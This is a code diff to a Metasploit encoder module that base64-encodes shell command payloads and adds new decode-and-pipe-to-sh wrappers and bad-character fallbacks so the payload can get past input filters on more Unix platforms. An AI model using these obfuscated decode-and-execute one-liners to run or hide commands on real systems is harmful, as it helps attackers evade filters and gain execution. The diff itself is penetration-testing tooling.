@@ -20,12 +20,12 @@ class MetasploitModule < Msf::Encoder
       },
       'Author' => 'Spencer McIntyre',
       'Arch' => ARCH_CMD,
-      'Platform' => %w[linux unix],
+      'Platform' => %w[bsd bsdi linux osx solaris unix],
       'EncoderType' => Msf::Encoder::Type::CmdPosixBase64)
 
     register_advanced_options(
       [
-        OptString.new('Base64Decoder', [ false, 'The binary to use for base64 decoding', '', %w[base64 openssl] ])
+        OptString.new('Base64Decoder', [ false, 'The binary to use for base64 decoding', '', %w[base64 base64-long base64-short openssl] ])
       ],
       self.class
     )
@@ -46,7 +46,12 @@ class MetasploitModule < Msf::Encoder
     base64_buf = Base64.strict_encode64(buf)
     case datastore['Base64Decoder']
     when 'base64'
+      raise EncodingError if (state.badchars.bytes & '(|)'.bytes).any?
 
+      base64_decoder = '(base64 --decode || base64 -d)'
+    when 'base64-long'
+      base64_decoder = 'base64 --decode'
+    when 'base64-short'
       base64_decoder = 'base64 -d'
     when 'openssl'
       base64_decoder = 'openssl enc -base64 -d'
@@ -54,8 +59,10 @@ class MetasploitModule < Msf::Encoder
       # find a decoder at runtime if we can use the necessary characters
       if (state.badchars.bytes & '(|)>/&'.bytes).empty?
         base64_decoder = '((command -v base64 >/dev/null && (base64 --decode || base64 -d)) || (command -v openssl >/dev/null && openssl enc -base64 -d))'
+      elsif (state.badchars.bytes & '(|)'.bytes).empty?
+        base64_decoder = '(base64 --decode || base64 -d)'
       else
-        base64_decoder = 'base64 -d'
+        base64_decoder = 'openssl enc -base64 -d'
       end
     end
 
@@ -63,6 +70,8 @@ class MetasploitModule < Msf::Encoder
       buf = "echo #{base64_buf}|#{base64_decoder}|sh"
     elsif (state.badchars.bytes & '<()'.bytes).empty?
       buf = "sh < <(#{base64_decoder} < <(echo #{base64_buf}))"
+    elsif (state.badchars.bytes & '<`\''.bytes).empty?
+      buf = "sh<<<`#{base64_decoder}<<<'#{base64_buf}'`"
     else
       raise EncodingError
     end
